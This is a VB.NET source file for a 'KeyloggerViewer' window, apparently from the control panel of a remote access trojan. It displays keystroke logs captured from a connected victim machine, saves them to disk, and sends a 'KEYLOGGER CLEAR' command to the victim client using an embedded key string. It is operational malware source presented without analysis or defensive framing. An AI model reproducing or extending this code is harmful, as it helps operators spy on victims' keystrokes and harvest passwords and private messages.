Imports System.Text
Imports System.IO
Public Class KeyloggerViewer
    Public Property log As String
    Public Property client As Connection
    Sub loaded() Handles Me.Load
        txtLog.Text = log
    End Sub
    Private Sub btnClean_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnClean.Click
        txtLog.Text = txtLog.Text.Replace("[BS]", "")
    End Sub
    Private Sub btnClear_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnClear.Click
        Dim w As New InfoWriter()
        w.WriteLine("KEYLOGGER")
        w.WriteLine("CLEAR")
        client.Send(w.GetBytes(Encoding.Default.GetBytes("MyHorseIsAmazing")))
        Me.Close()
    End Sub

    Private Sub btnSave_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnSave.Click
        Using s As New SaveFileDialog()
            s.Filter = "Text Files |*.txt"
            If (s.ShowDialog() = Windows.Forms.DialogResult.OK) Then
                File.WriteAllLines(s.FileName, txtLog.Lines)
                Notify(Main.tray, "Log Saved to: " + s.FileName, "Log Saved to Disk.", ToolTipIcon.Info, 3)
            End If
        End Using
    End Sub

    Private Sub Label1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        Shell("http://fkn0wned.com")
    End Sub

    Private Sub LinkLabel1_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Shell("explorer.exe http://fkn0wned.com")
    End Sub
End Class